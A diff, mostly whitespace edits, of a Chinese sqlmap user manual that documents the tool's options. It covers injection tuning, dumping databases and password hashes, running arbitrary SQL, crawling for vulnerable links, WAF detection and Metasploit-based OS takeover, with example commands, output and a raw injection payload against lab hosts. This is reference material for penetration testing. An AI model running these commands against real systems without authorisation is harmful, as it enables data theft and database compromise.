 	默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。
 
 #### 设定UNION查询使用的字符
 
 	参数：--union-char
-
+	
 	默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。
 
 #### 二阶SQL注入
 
 	参数：--second-order
-
+	
 	有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。
 
 ### 2.7列数据
@@ -550,41 +984,41 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 标志
 
 	参数：-b,--banner
-
+	
 	大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
 
 #### 用户
 
 	参数：-current-user
-
+	
 	在大多数据库中可以获取到管理数据的用户。
 
 #### 当前数据库
 
 	参数：--current-db
-
+	
 	返还当前连接的数据库。
 
 #### 当前用户是否为管理用
 
 	参数：--is-dba
-
+	
 	判断当前的用户是否为管理，是的话会返回True。
 
 #### 列数据库管理用户
 
 	参数：--users
-
+	
 	当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
 
 #### 列出并破解数据库用户的hash
 
 	参数：--passwords
-
+	
 	当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
-
+	
 	例子：
-
+	
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
 	[...]
 	back-end DBMS: PostgreSQL
@@ -611,41 +1045,41 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 列出数据库管理员权限
 
 	参数：--privileges
-
+	
 	当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。
 
 #### 列出数据库管理员角色
 
 	参数：--roles
-
+	
 	当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。
-
+	
 	仅适用于当前数据库是Oracle的时候。
 
 #### 列出数据库系统的数据库
 
 	参数：--dbs
-
+	
 	当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。
 
 #### 列举数据库表
 
 	参数：--tables,--exclude-sysdbs,-D
-
+	
 	当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
-
+	
 	如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
-
+	
 	--exclude-sysdbs参数是指包含了所有的系统数据库。
-
+	
 	需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
 
 #### 列举数据库表中的字段
 
 	参数：--columns,-C,-T,-D
-
+	
 	当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
-
+	
 	如果没有使用-D参数指定数据库时，默认会使用当前数据库。
 
 列举一个SQLite的例子：
@@ -665,9 +1099,9 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 列举数据库系统的架构
 
 	参数：--schema,--exclude-sysdbs
-
+	
 	用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。
-
+	
 	加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。
 
 MySQL例子：
@@ -727,11 +1161,11 @@ MySQL例子：
 #### 获取表中数据个数
 
 	参数：--count
-
+	
 	有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。
-
+	
 	列举一个Microsoft SQL Server例子：
-
+	
 	$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
 	[...]
 	Database: testdb
@@ -745,13 +1179,13 @@ MySQL例子：
 #### 获取整个表的数据
 
 	参数：--dump,-C,-T,-D,--start,--stop,--first,--last
-
+	
 	如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。
-
+	
 	使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。
-
+	
 	列举一个Firebird的例子：
-
+	
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
 	[...]
 	Database: Firebird_masterdb
@@ -778,7 +1212,7 @@ sqlmap为每个表生成了一个CSV文件。
 #### 获取所有数据库表的内容
 
 	参数：--dump-all,--exclude-sysdbs
-
+	
 	使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。
 
 #### 搜索字段，表，数据库
@@ -804,7 +1238,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 列举一个Mircrosoft SQL Server 2000的例子：
 
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
-
+	
 	[...]
 	[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
 	[hh:mm:14] [INFO] retrieved: foo
@@ -845,7 +1279,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 列举一个MySQL 4.1的例子：
 
 	$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
-
+	
 	[...]
 	[hh:mm:39] [INFO] testing MySQL
 	[hh:mm:39] [INFO] confirming MySQL
@@ -1003,7 +1437,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 列举一个MySQL例子：
 
 	$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit
-
+	
 	[...]
 	[hh:mm:31] [INFO] the back-end DBMS is MySQL
 	web server operating system: Windows 2003
@@ -1136,36 +1570,36 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 #### 从sqlite中读取session
 
 	参数：-s
-
+	
 	sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。
 
 #### 保存HTTP(S)日志
 
 	参数：-t
-
+	
 	这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。
 
 #### 非交互模式
 
 	参数：--batch
-
+	
 	用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
 
 #### 强制使用字符编码
 
 	参数：--charset
-
+	
 	不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：
-
+	
 	--charset=GBK
 #### 爬行网站URL
 
 	参数：--crawl
-
+	
 	sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。
-
+	
 	例子：
-
+	
 	$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
 	[...]
 	[xx:xx:53] [INFO] starting crawler
@@ -1180,20 +1614,20 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 #### 规定输出到CSV中的分隔符
 
 	参数：--csv-del
-
+	
 	当dump保存为CSV格式时（--dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如：
-
+	
 	--csv-del=";"
 #### DBMS身份验证
 
 	参数：--dbms-cred
-
+	
 	某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如Microsoft SQL Server的OPENROWSET函数
 
 #### 定义dump数据的格式
 
 	参数：--dump-format
-
+	
 	输出的格式可定义为：CSV，HTML，SQLITE
 
 #### 预估完成时间
@@ -1205,7 +1639,7 @@ sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语�
 例如Oracle的布尔型盲注：
 
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
-
+	
 	[...]
 	[hh:mm:01] [INFO] the back-end DBMS is Oracle
 	[hh:mm:01] [INFO] fetching banner
@@ -1249,7 +1683,7 @@ sqlmap先输出长度，预计完成时间，显示百分比，输出字符
 针对PostgreSQL例子：
 
 	$ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
-
+	
 	[...]
 	[xx:xx:14] [INFO] fetching banner
 	[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
@@ -1324,13 +1758,13 @@ sqlmap默认把session文件跟结果文件保存在output文件夹下，用此�
 #### 发现SQL注入时发出蜂鸣声
 
 	参数：--beep
-
+	
 	发现sql注入时，发出蜂鸣声。
 
 #### 启发式检测WAF/IPS/IDS保护
 
 	参数：--check-waf
-
+	
 	WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试
 
 例如：
@@ -1484,17 +1918,17 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 #### 初级用户向导参数
 
 	参数：--wizard 面向初级用户的参数，可以一步一步教你如何输入针对目标注入。
-
+	
 	$ python sqlmap.py --wizard
-
-    	sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
-
+	
+		sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
+	
 	http://sqlmap.org
-
+	
 	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
+	
 	[*] starting at 11:25:26
-
+	
 	Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1
 	POST data (--data) [Enter for None]: 
 	Injection difficulty (--level/--risk). Please choose:
@@ -1558,3 +1992,11 @@ sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目
 	
 	[*] shutting down at 11:25:52
 【原文：sqlmap用户手册  整理发布@小西】
+
+
+
+---
+
+## 参考:
+
+1. https://micro8.gitbook.io/micro8/di-yi-zhang-sheng/5-gong-ju-jie-shao-sqlmap
